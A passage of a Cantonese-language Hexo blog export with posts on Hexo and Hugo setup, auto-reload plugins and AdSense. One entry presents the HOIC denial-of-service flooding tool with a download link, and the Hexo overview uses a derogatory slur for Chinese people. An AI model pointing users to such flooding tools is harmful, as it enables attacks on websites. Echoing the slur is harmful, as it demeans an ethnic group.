<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">npm install -g browser-sync</span><br></pre></td></tr></table></figure>

<p>裝左之後打 <code>browser-sync</code> 試下有冇反應</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">C:\Users\DLLM&gt; browser-sync</span><br><span class="line">bin.js [command]</span><br><span class="line"></span><br><span class="line">Commands:</span><br><span class="line">  bin.js start   Start the server</span><br><span class="line">  bin.js init    Create a configuration file</span><br><span class="line">  bin.js reload  Send a reload event over HTTP protocol</span><br><span class="line">  bin.js recipe  Generate the files for a recipe</span><br><span class="line"></span><br><span class="line">Options:</span><br><span class="line">  --help     Show help                                                 [boolean]</span><br><span class="line">  --version  Show version number                                       [boolean]</span><br><span class="line"></span><br><span class="line">For help running a certain command, type &lt;command&gt; --help</span><br><span class="line">  bin.js start --help</span><br><span class="line"></span><br><span class="line">You can run a static server by providing a path(s) directly</span><br><span class="line">  bin.js app/src app/tmp</span><br><span class="line"></span><br><span class="line">If the directory contains a &#x27;index.html&#x27; file, you can omit any input</span><br><span class="line">  bin.js</span><br><span class="line"></span><br><span class="line">You can run the proxy in this manner too</span><br><span class="line">  bin.js https://example.com</span><br><span class="line"></span><br><span class="line">To run a proxy, whilst also serving static files</span><br><span class="line">  bin.js https://example.com htdocs/themes/example</span><br></pre></td></tr></table></figure>

<p>如果有反應即係你成功裝左。</p>
<p>喺你既 hexo blog 入面既 folder 再打</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">npm install hexo-browsersync --save</span><br></pre></td></tr></table></figure>

<p>完成哂以上既步驟再 rerun 你部 localhost，<br>之後你就會發現每當你 儲存既時候就會 自己 重新整理個 Page。</p>
<p>page 右上角都會出現一個 Message，<br>或者你手動動新整理都會出現</p>
<img src="/2022/01/30/Hexo-auto-reload-page%20browsersync/done.png" class="">

<p>每次 讀取 page 既時候，<br>你既後台都會出現呢句 (如果你係打 <code>hexo server --debug</code> 先會有)</p>
<img src="/2022/01/30/Hexo-auto-reload-page%20browsersync/save.png" class="">

<p>每當你開一次 localhost debug 就會有</p>
<ul>
<li>3001 Port (更改 Browsersync 相關設定)</li>
</ul>
<img src="/2022/01/30/Hexo-auto-reload-page%20browsersync/start.png" class="">
<h2 id="Delete"><a href="#Delete" class="headerlink" title="Delete"></a>Delete</h2><p>如果你唔想用可以咁打</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">npm uninstall hexo-browsersync --save</span><br></pre></td></tr></table></figure>

<p>參考資料 :<br><a href="https://github.com/sss63232/git-notebook/blob/master/Hexo/%E5%9C%A8-hexo-s-%E9%A0%81%E9%9D%A2%E8%87%AA%E5%8B%95%E5%88%B7%E6%96%B0.md">https://github.com/sss63232/git-notebook/blob/master/Hexo/%E5%9C%A8-hexo-s-%E9%A0%81%E9%9D%A2%E8%87%AA%E5%8B%95%E5%88%B7%E6%96%B0.md</a><br><a href="https://browsersync.io/">https://browsersync.io/</a></p>
]]></content>
      <categories>
        <category>NPM</category>
        <category>Hexo</category>
      </categories>
      <tags>
        <tag>指令</tag>
      </tags>
  </entry>
  <entry>
    <title>Hexo - 自動重新整理頁面 livereload (已失效)</title>
    <url>/2022/01/30/Hexo-auto-reload-page-livereload/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>要喺 localhost 進行網頁測試，<br>要成日 F5 F5 F5 撳都撳到好攰，<br>所以今篇文係講點樣，<br>每當你 儲存 (Ctrl + S) 後，<br>點樣自動 頁面重新整理，</p>
<p>工具有好多款，但今款我會用呢款工具 <a href="https://github.com/hexojs/hexo-livereload">livereload</a></p>
<p>呢款就唔同 <a href="https://browsersync.io/">browsersync</a> 一樣，<br>佢功能上唔夠多呢款多，<br>但係對單純只係想 auto reload page 既人黎講，<br>用呢款已經夠做。</p>
<h1 id="2022-1-30"><a href="#2022-1-30" class="headerlink" title="2022.1.30"></a>2022.1.30</h1><p>正當我諗住出 Post 既時候，<br>test 下 test 下發現，<br>呢個工具已經唔 work，<br>睇返原本上一次更新已經係 6年前，<br>難怪係唔 work，<br>不過唔緊要，<br>反正都係當係 notes，<br>寫埋先 ~</p>
<h1 id="開始"><a href="#開始" class="headerlink" title="開始"></a>開始</h1><p>cd 入到去你既 hexo blog folder，<br>再打</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">npm install hexo-livereload --save</span><br></pre></td></tr></table></figure>

<p>你可以喺 <code>config.yml</code><br>改佢既 Default</p>
<ul>
<li>port - LiveReload port (Default: 35729)</li>
</ul>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">livereload:</span></span><br><span class="line">  <span class="attr">port:</span> <span class="number">4001</span></span><br></pre></td></tr></table></figure>

<p><a href="https://github.com/hexojs/hexo-livereload">https://github.com/hexojs/hexo-livereload</a><br><a href="https://www.opensourceagenda.com/projects/hexo-livereload">https://www.opensourceagenda.com/projects/hexo-livereload</a></p>
]]></content>
      <categories>
        <category>NPM</category>
        <category>Hexo</category>
      </categories>
      <tags>
        <tag>指令</tag>
        <tag>網站</tag>
        <tag>Framework</tag>
      </tags>
  </entry>
  <entry>
    <title>Hexo Butterfly - 安裝 Google AdSense</title>
    <url>/2022/06/21/Hexo-butterfly-install-google-adsense-to-your-blog/</url>
    <content><![CDATA[<img src="/img/Post/image/Google/adsense/gads.svg" width="200px"/>

<h1 id="什麼是-Google-AdSense？"><a href="#什麼是-Google-AdSense？" class="headerlink" title="什麼是 Google AdSense？"></a>什麼是 Google AdSense？</h1><p>Google AdSense係由 Google 營運嘅一項計劃，Google 內容網絡網站中嘅網站發佈商會投放針對網站內容同受眾嘅文本、圖、影片或互動媒體廣告，簡單黎講，即係一個投放廣告既野。</p>
<p>【名稱】：Google AdSense<br>【網站】：<a href="https://www.google.com/adsense">按這裡</a><br>【用途】：為你的作品放置廣告</p>
<h1 id="申請-Google-AdSense"><a href="#申請-Google-AdSense" class="headerlink" title="申請 Google AdSense"></a>申請 Google AdSense</h1><blockquote>
<p>注意 : 要進入 Google AdSense 網站，請 <code>將你瀏覽器內的封鎖廣告插件通通都關掉</code>。</p>
</blockquote>
<hr>
<h2 id="Get-Started"><a href="#Get-Started" class="headerlink" title="Get Started"></a>Get Started</h2><p>直接按下上方的網站連結後，按下 <code>Get started</code>。</p>
<img src="/2022/06/21/Hexo-butterfly-install-google-adsense-to-your-blog/1.png" class="">

<h2 id="登入帳號-選擇帳號"><a href="#登入帳號-選擇帳號" class="headerlink" title="登入帳號 / 選擇帳號"></a>登入帳號 / 選擇帳號</h2><p>選擇你要使用 Google AdSense 的帳號。</p>
<img src="/2022/06/21/Hexo-butterfly-install-google-adsense-to-your-blog/2.png" class="">

<h2 id="輸入網站等資訊"><a href="#輸入網站等資訊" class="headerlink" title="輸入網站等資訊"></a>輸入網站等資訊</h2><p>輸入你要加入廣和的網站，收款國家，填好後按下 <code>開始使用 AdSense</code>。</p>
<img src="/2022/06/21/Hexo-butterfly-install-google-adsense-to-your-blog/3.png" class="">


<h2 id="申請成功"><a href="#申請成功" class="headerlink" title="申請成功"></a>申請成功</h2><p>看到主頁就代表你申請成功，但是接下來才是重頭戲，這裡要設置你的網站。</p>
<img src="/2022/06/21/Hexo-butterfly-install-google-adsense-to-your-blog/4.png" class="">

<h1 id="設置付款資料"><a href="#設置付款資料" class="headerlink" title="設置付款資料"></a>設置付款資料</h1><hr>
<h2 id="輸入資訊"><a href="#輸入資訊" class="headerlink" title="輸入資訊"></a>輸入資訊</h2><p>從主頁中按下 <code>輸入資訊</code>。</p>
<img src="/2022/06/21/Hexo-butterfly-install-google-adsense-to-your-blog/5.png" class="">

<h2 id="填寫資訊"><a href="#填寫資訊" class="headerlink" title="填寫資訊"></a>填寫資訊</h2><p>輸入你的個人資訊後按下 <code>提交</code>。</p>
<img src="/2022/06/21/Hexo-butterfly-install-google-adsense-to-your-blog/6.png" class="">

<h1 id="設置網站連結-程式碼"><a href="#設置網站連結-程式碼" class="headerlink" title="設置網站連結 (程式碼)"></a>設置網站連結 (程式碼)</h1><hr>
<h2 id="開始使用"><a href="#開始使用" class="headerlink" title="開始使用"></a>開始使用</h2><p>從主頁中按下 <code>開始使用</code>。</p>
<img src="/2022/06/21/Hexo-butterfly-install-google-adsense-to-your-blog/7.png" class="">

<h2 id="新增程式碼至網站"><a href="#新增程式碼至網站" class="headerlink" title="新增程式碼至網站"></a>新增程式碼至網站</h2><p>將程式碼複製後，前往你的 Hexo Butterfly <code>_config.butterfly.yml</code>。</p>
<blockquote>
<p>說明 : 只需將 <code>client=</code> 後面的複製就可以，即是 <code>ca-pub-9421894821052</code>。</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-9421894821052&quot; # 你的 pub id</span><br></pre></td></tr></table></figure>

<img src="/2022/06/21/Hexo-butterfly-install-google-adsense-to-your-blog/8.png" class="">

<h3 id="修改-yml-檔案"><a href="#修改-yml-檔案" class="headerlink" title="修改 yml 檔案"></a>修改 <code>yml</code> 檔案</h3><p>進入到 <code>_config.butterfly.yml</code> 後，將原本的 :</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Google Adsense (谷歌廣告)</span></span><br><span class="line"><span class="attr">google_adsense:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">false</span></span><br><span class="line">  <span class="attr">auto_ads:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">js:</span> <span class="string">https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js</span></span><br><span class="line">  <span class="attr">client:</span></span><br><span class="line">  <span class="attr">enable_page_level_ads:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure>

<p>修改至這樣。</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Google Adsense (谷歌廣告)</span></span><br><span class="line"><span class="attr">google_adsense:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">auto_ads:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">js:</span> <span class="string">https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js</span></span><br><span class="line">  <span class="attr">client:</span> <span class="string">ca-pub-9421894821052</span></span><br><span class="line">  <span class="attr">enable_page_level_ads:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure>

<p>然後將 Server <code>clean</code> 後再啟動。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">hexo clean</span><br><span class="line">hexo s --debug</span><br></pre></td></tr></table></figure>

<h3 id="確定已加入-ads-js"><a href="#確定已加入-ads-js" class="headerlink" title="確定已加入 ads.js"></a>確定已加入 ads.js</h3><p>我會使用 <code>Privacy Badget</code> 按下後查看，如果看到以下連結代表新增成功。</p>
<pre><code> pagead2.googlesyndication.com
</code></pre>
<h2 id="尚待審查"><a href="#尚待審查" class="headerlink" title="尚待審查"></a>尚待審查</h2><hr>
<h3 id="Push-Github-Pages"><a href="#Push-Github-Pages" class="headerlink" title="Push Github Pages"></a>Push Github Pages</h3><p>首先我們輸入以下指令 Push 至 Github Pages。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">hexo deploy</span><br></pre></td></tr></table></figure>

<h3 id="要求審查"><a href="#要求審查" class="headerlink" title="要求審查"></a>要求審查</h3><p>當你完成以上的步驟後，按下 <code>要求審查</code>。</p>
<img src="/2022/06/21/Hexo-butterfly-install-google-adsense-to-your-blog/11.png" class="">


<h3 id="審查中-…"><a href="#審查中-…" class="headerlink" title="審查中 …"></a>審查中 …</h3><p>看到以下畫面就代表成功，接下只需等待他審核完成 ~~</p>
<img src="/2022/06/21/Hexo-butterfly-install-google-adsense-to-your-blog/12.png" class="">]]></content>
      <categories>
        <category>NPM</category>
        <category>Hexo</category>
      </categories>
      <tags>
        <tag>Google</tag>
        <tag>網站</tag>
        <tag>Framework</tag>
        <tag>Themes</tag>
        <tag>Hexo Butterfly</tag>
      </tags>
  </entry>
  <entry>
    <title>Hexo - 靜態網站生成器</title>
    <url>/2021/12/11/Hexo-list/</url>
    <content><![CDATA[<img src="/img/Post/image/Hexo/cover.svg" width="200px"/>

<h1 id="關於-Hexo"><a href="#關於-Hexo" class="headerlink" title="關於 Hexo"></a>關於 Hexo</h1><p>Hexo 是一個基於 Node.js 製作的一個靜態網站 Framework，他不需使用後台連接數據庫而又能建立一個寫文章的環境。</p>
<h2 id="優點"><a href="#優點" class="headerlink" title="優點"></a>優點</h2><ul>
<li>免後台，減低被入侵風險</li>
<li>簡單快速，使用 Node.js 的 Framework。</li>
<li>非常多外掛提供使用 (hexo 資源多)</li>
<li>一個指令就可以執行全部東西</li>
<li>Github Page 支援</li>
<li>Markdown 語言支援</li>
<li>多個主題選擇</li>
<li>簡單快速就可以切換主題</li>
<li>使用 npm，因此很多插件提供 (npm 資源多)</li>
<li>容量小，網站速度和性能更快</li>
<li>台灣人製作</li>
</ul>
<h2 id="缺點"><a href="#缺點" class="headerlink" title="缺點"></a>缺點</h2><ul>
<li>超多支那人使用，這個是非常大的問題 (殘體字)</li>
<li>對於不會指令的人來說不友善，因為你需要使用指令才可以執行操作</li>
<li>需要搭建 NodeJS 環境才可操作下去</li>
</ul>
<hr>
<h1 id="安裝需求"><a href="#安裝需求" class="headerlink" title="安裝需求"></a>安裝需求</h1><p>如要使用 Hexo 建立 Blog，你必須電腦已經安裝了 NodeJS。</p>
<p>如果不懂安裝 NodeJS 的人可以參考這篇文章：<a href="/2022/06/26/windows-install-nodejs/">NodeJS - 安裝於 Windows 系統內</a></p>
<hr>
<h1 id="安裝-Hexo"><a href="#安裝-Hexo" class="headerlink" title="安裝 Hexo"></a>安裝 Hexo</h1><p>確定你係有 npm 之後輸入以下指令安裝 Hexo：</p>
<div class="note info flat">
    -g : 代表全局安裝，即係唔係得你呢個 repo 有，而係幫你部電腦裝 hexo。
</div>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">npm install -g hexo-cli</span><br></pre></td></tr></table></figure>

<hr>
<h1 id="建立本地儲存庫"><a href="#建立本地儲存庫" class="headerlink" title="建立本地儲存庫"></a>建立本地儲存庫</h1><p>安裝 hexo 後，需要建立一個 <code>本地儲存庫</code> 給 hexo 使用。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">hexo init &quot;web name&quot;</span><br></pre></td></tr></table></figure>

<hr>
<h1 id="建立新文章"><a href="#建立新文章" class="headerlink" title="建立新文章"></a>建立新文章</h1><p>新文章建立 (即係出 Post)。</p>
<p>要出 Post既話，我地輸入以下指令開一個新既 Post。</p>
<div class="note warning flat">
    注意 : 名稱要符合電腦檔案名稱格式需求，即係話符號唔俾咁打咁解 (eg: <code>\/</code>)。
</div>

<h2 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a><strong><span style="font-size:larger;">方法一</span></strong></h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">hexo new &quot;Post name&quot;</span><br></pre></td></tr></table></figure>

<h2 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a><strong><span style="font-size:larger;">方法二</span></strong></h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">hexo new post &quot;Post name&quot;</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
<hr>
<h1 id="增加標籤-tags"><a href="#增加標籤-tags" class="headerlink" title="增加標籤 (tags)"></a>增加標籤 (tags)</h1><p>我地接下來要做既野係為左幫你起既文章做一個分類類別，加上 tags。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">hexo new page tags</span><br></pre></td></tr></table></figure>
<p>然後去 <code>source/tags/index.md</code></p>
<p>加個 type:</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="attr">title:</span> <span class="string">tags</span></span><br><span class="line"><span class="attr">date:</span> <span class="number">2021-12-14 05:25:33</span></span><br><span class="line"><span class="attr">type:</span> <span class="string">&quot;tags&quot;</span></span><br><span class="line"><span class="meta">---</span></span><br></pre></td></tr></table></figure>

<h2 id="文章加入-Tags"><a href="#文章加入-Tags" class="headerlink" title="文章加入 Tags"></a>文章加入 Tags</h2><p>喺個個 Post 入面加 Tags 只需要打</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">tags:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">tags1</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">tags2</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">tags3</span></span><br></pre></td></tr></table></figure>

<hr>
<h1 id="增加分類-categories"><a href="#增加分類-categories" class="headerlink" title="增加分類 (categories)"></a>增加分類 (categories)</h1><p>我地接下來要做既野係為左幫你起既文章做一個分類類別，加上 categories。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">hexo new page categories</span><br></pre></td></tr></table></figure>

<p>然後去 <code>source/categories/index.md</code></p>
<p>加個 type:</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="attr">title:</span> <span class="string">categories</span></span><br><span class="line"><span class="attr">date:</span> <span class="number">2021-12-11 03:06:28</span></span><br><span class="line"><span class="attr">type:</span> <span class="string">&quot;categories&quot;</span></span><br><span class="line"><span class="meta">---</span></span><br></pre></td></tr></table></figure>
<h2 id="文章加入-Categories"><a href="#文章加入-Categories" class="headerlink" title="文章加入 Categories"></a>文章加入 Categories</h2><p>喺個個 Post 入面加 Categories 只需要打</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">categories:</span></span><br><span class="line">    <span class="bullet">-</span> [<span class="string">分類1</span>, <span class="string">子分類2</span>, <span class="string">子分類3</span>]</span><br></pre></td></tr></table></figure>

<hr>
<h1 id="本機伺服器啟動"><a href="#本機伺服器啟動" class="headerlink" title="本機伺服器啟動"></a>本機伺服器啟動</h1><p>以下是關於啟動伺服器的指令</p>
<hr>
<h2 id="普通啟動"><a href="#普通啟動" class="headerlink" title="普通啟動"></a>普通啟動</h2><p>普通啟動是指不使用任何參數啟動本機伺服器。</p>
<hr>
<h3 id="方法一-1"><a href="#方法一-1" class="headerlink" title="方法一"></a><strong><span style="font-size:larger;">方法一</span></strong></h3><div class="note info flat">
    全寫示範
</div>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">hexo server</span><br></pre></td></tr></table></figure>

<h3 id="方法二-1"><a href="#方法二-1" class="headerlink" title="方法二"></a><strong><span style="font-size:larger;">方法二</span></strong></h3><div class="note info flat">
    簡寫示範
</div>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">hexo s</span><br></pre></td></tr></table></figure>

<h2 id="Debug-模式"><a href="#Debug-模式" class="headerlink" title="Debug 模式"></a>Debug 模式</h2><p>Debug 模式可以讓你更清楚知道網站的狀態，例如會於 Terminal 中顯示 <code>404</code> <code>200</code>，是否成功載入圖片等資訊。</p>
<hr>
<h3 id="方法一-2"><a href="#方法一-2" class="headerlink" title="方法一"></a><strong><span style="font-size:larger;">方法一</span></strong></h3><div class="note info flat">
    全寫示範
</div>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">hexo server --debug</span><br></pre></td></tr></table></figure>

<h3 id="方法二-2"><a href="#方法二-2" class="headerlink" title="方法二"></a><strong><span style="font-size:larger;">方法二</span></strong></h3><div class="note info flat">
    簡寫示範
</div>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">hexo s --debug</span><br></pre></td></tr></table></figure>

<h2 id="靜態模式"><a href="#靜態模式" class="headerlink" title="靜態模式"></a>靜態模式</h2><p>唔會再自動更新。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">hexo server -s</span><br></pre></td></tr></table></figure>

<h2 id="更改端口"><a href="#更改端口" class="headerlink" title="更改端口"></a>更改端口</h2><p>Port 改做 <code>6000</code>。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">hexo server -p 6000</span><br></pre></td></tr></table></figure>

<h2 id="自訂-IP"><a href="#自訂-IP" class="headerlink" title="自訂 IP"></a>自訂 IP</h2><p>改做 192.168.0.200 係你既 Server IP (Private)</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">hexo server -i 192.168.0.200</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
<hr>
<h1 id="生成靜態檔案"><a href="#生成靜態檔案" class="headerlink" title="生成靜態檔案"></a>生成靜態檔案</h1><p>呢度生成既檔案就係你個 web 睇到既檔案。</p>
<div class="note info flat">
    說明 : 根據你既 markdown 檔案去生成。
</div>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">hexo generate</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
]]></content>
      <categories>
        <category>Hexo</category>
      </categories>
      <tags>
        <tag>網站</tag>
        <tag>Framework</tag>
      </tags>
  </entry>
  <entry>
    <title>Hexo: ! [remote rejected] HEAD -&gt; master (pre-receive hook declined)</title>
    <url>/2022/01/29/Hexo-remote-rejected-HEAD-master-pre-receive-hook-declined/</url>
    <content><![CDATA[<h1 id="唔知點解"><a href="#唔知點解" class="headerlink" title="唔知點解"></a>唔知點解</h1><p>岩岩諗住 push 野上黎既時候，<br>發現出左 error，<br>明明好地地，<br>睇完 error 出乜之後，<br>原來佢話我個 <code>gif</code> 太大<br>over 左 <code>100 MB</code>，<br>唔俾我 upload。</p>
<p>然後我諗住試下 del 左成個 <code>md</code> <code>gif</code> files<br>廢時搞 file limit - -<br>但係點知，<br>都係一樣唔得 ._&lt;</p>
<img src="/2022/01/29/Hexo-remote-rejected-HEAD-master-pre-receive-hook-declined/error.png" class="">

<h1 id="解決方法"><a href="#解決方法" class="headerlink" title="解決方法"></a>解決方法</h1><p>之後我搵到解決方法，<br>就係 del 左成個 <code>.deploy_git</code> folder，<br>然後再 push 多次就得，<br>但係咁做會有個問題，<br>就係之前既 commit 會食哂，<br>不過冇計啦 :(</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo deploy</span><br></pre></td></tr></table></figure>

<p><a href="https://github.com/hexojs/hexo/issues/1638">https://github.com/hexojs/hexo/issues/1638</a></p>
]]></content>
      <categories>
        <category>NPM</category>
        <category>Hexo</category>
      </categories>
      <tags>
        <tag>問題</tag>
        <tag>CLI</tag>
      </tags>
  </entry>
  <entry>
    <title>Hexo Tab 功能</title>
    <url>/2022/02/22/Hexo-tab-functions-some-themes/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>應該就唔係款款 Theme 都用到 tab 功能 …</p>
<h2 id="開始"><a href="#開始" class="headerlink" title="開始"></a>開始</h2><p>我唔解釋啦…<br>自己睇 code</p>
<figure class="highlight md"><table><tr><td class="code"><pre><span class="line">&#123;%  tabs test1 %&#125;</span><br><span class="line">&lt;!-- tab g1 --&gt;</span><br><span class="line">g1</span><br><span class="line">&lt;!-- endtab --&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- tab g2--&gt;</span><br><span class="line">g2</span><br><span class="line">&lt;!-- endtab --&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- tab g3--&gt;</span><br><span class="line">g3</span><br><span class="line">&lt;!-- endtab --&gt;</span><br><span class="line"></span><br><span class="line">&#123;% endtabs %&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Result"><a href="#Result" class="headerlink" title="Result"></a>Result</h2><div class="tabs" id="test1"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#test1-1">g1</button></li><li class="tab"><button type="button" data-href="#test1-2">g2</button></li><li class="tab"><button type="button" data-href="#test1-3">g3</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="test1-1"><p>g1</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="test1-2"><p>g2</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="test1-3"><p>g3</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div>]]></content>
      <categories>
        <category>Hexo</category>
      </categories>
      <tags>
        <tag>Markdown</tag>
      </tags>
  </entry>
  <entry>
    <title>Hexo - 修改 yml 檔後冇反應？</title>
    <url>/2022/01/29/Hexo-yml-change/</url>
    <content><![CDATA[<h1 id="點解？"><a href="#點解？" class="headerlink" title="點解？"></a>點解？</h1><h3 id="yml"><a href="#yml" class="headerlink" title="yml"></a>yml</h3><p>每改一次 <code>yml</code> 入面既野，<br>無論係 <code>themes</code> 既 <code>yml</code> 檔，<br>定係你原本既 <code>yml</code> 都好，<br>你都係需要 <code>rerun</code> (重新開啟) 一次個 <code>localhost</code>，<br>先會睇到改左既野。</p>
<h3 id="md"><a href="#md" class="headerlink" title="md"></a>md</h3><p>而 <code>md</code> (Markdown) 檔就唔洗。</p>
<h3 id="themes"><a href="#themes" class="headerlink" title="themes"></a>themes</h3><p>如果試哂 <code>rerun</code> 都唔得，<br>就試埋 <code>clea</code>n 個 <code>database</code>，</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">hexo clean</span><br></pre></td></tr></table></figure>

<p>咁就一定得啦 ~</p>
]]></content>
      <categories>
        <category>NPM</category>
        <category>Hexo</category>
      </categories>
      <tags>
        <tag>修改</tag>
      </tags>
  </entry>
  <entry>
    <title>Hoic 高軌道離子炮 - DoS 網路測試工具</title>
    <url>/2022/06/08/High-Orbit-Ion-Cannon-Apps-DOS/</url>
    <content><![CDATA[<h1 id="HOIC"><a href="#HOIC" class="headerlink" title="HOIC"></a>HOIC</h1><p>High Orbit Ion Cannon (HOIC) 是一個開源網絡壓力測試和拒絕服務攻擊應用程序，旨在同時攻擊多達 256 個 URL。</p>
<ul>
<li>高速多線程 HTTP 洪水功擊</li>
<li>可以同時功擊 256 個網站</li>
</ul>
<p>【軟件名稱】：High Orbit Ion Cannon (HOIC)<br>【支援系統】：Windows 7 或以上<br>【軟件語言】：英文<br>【下載軟件】：<a href="https://sourceforge.net/projects/highorbitioncannon/">按這裡</a></p>
<h2 id="程式圖片"><a href="#程式圖片" class="headerlink" title="程式圖片"></a>程式圖片</h2><img src="/2022/06/08/High-Orbit-Ion-Cannon-Apps-DOS/hoic.png" class="">]]></content>
      <categories>
        <category>工具介紹</category>
      </categories>
      <tags>
        <tag>DoS</tag>
      </tags>
  </entry>
  <entry>
    <title>Hugo 超快速教學</title>
    <url>/2022/01/29/Hugo-quick-start/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>上一篇就教左大家點裝 Hugo<br>未睇既可以撳呢條 <a href="/2022/01/28/Debian-install-Hugo/">Link</a> 睇返</p>
<p>今篇就會教大家點用 Hugo 起網</p>
<h1 id="開始"><a href="#開始" class="headerlink" title="開始"></a>開始</h1><h2 id="建立-Project"><a href="#建立-Project" class="headerlink" title="建立 Project"></a>建立 Project</h2><p>我地要 create 個 project</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">hugo new site Site-Name</span><br></pre></td></tr></table></figure>

<p>然後打</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git init</span><br></pre></td></tr></table></figure>

<h2 id="搵-Themes"><a href="#搵-Themes" class="headerlink" title="搵 Themes"></a>搵 Themes</h2><p>之後我地去 <a href="https://themes.gohugo.io/">https://themes.gohugo.io/</a> 搵 Themes</p>
<p>我以 <a href="https://github.com/matcornic/hugo-theme-learn">Learn</a> 做示範。</p>
<h2 id="加-Themes"><a href="#加-Themes" class="headerlink" title="加 Themes"></a>加 Themes</h2><p>我地 cd 入去 Site-Name</p>
<p>再打</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git submodule add https://github.com/matcornic/hugo-theme-learn.git themes/learn</span><br></pre></td></tr></table></figure>

<p>然後我地需要喺 <code>config.toml</code> 入面加一行</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">theme = \&quot;learn\&quot;</span><br></pre></td></tr></table></figure>

<p>咁就打</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">echo theme = \&quot;learn\&quot; &gt;&gt; config.toml</span><br></pre></td></tr></table></figure>

<h2 id="開-localhost"><a href="#開-localhost" class="headerlink" title="開 localhost"></a>開 localhost</h2><p>完成哂以上既步驟就可以開 Server 試下。</p>
<p>打</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">hugo server -D</span><br></pre></td></tr></table></figure>

<img src="/2022/01/29/Hugo-quick-start/done.png" class="">

<h2 id="出-Post"><a href="#出-Post" class="headerlink" title="出 Post"></a>出 Post</h2><p>如果要出 Post 就咁打</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">hugo new posts/PostName.md</span><br></pre></td></tr></table></figure>

<img src="/2022/01/29/Hugo-quick-start/new%20post.png" class="">

<p>完成。</p>
<p>超撚易就起左個網。<br>你只需要學識基本 markdown, html 語法，<br>就可以出 Post :3</p>
<p>參考資料<br><a href="https://gohugo.io/getting-started/quick-start/">https://gohugo.io/getting-started/quick-start/</a><br><a href="https://www.youtube.com/watch?v=lKT-tztvIEU">https://www.youtube.com/watch?v=lKT-tztvIEU</a></p>
]]></content>
      <categories>
        <category>Hugo</category>
      </categories>
      <tags>
        <tag>指令</tag>
        <tag>網站</tag>
        <tag>Framework</tag>
      </tags>
  </entry>
  <entry>
    <title>Java Jframe - 設置可見</title>
    <url>/2022/01/22/Java-Jframe-Visible/</url>
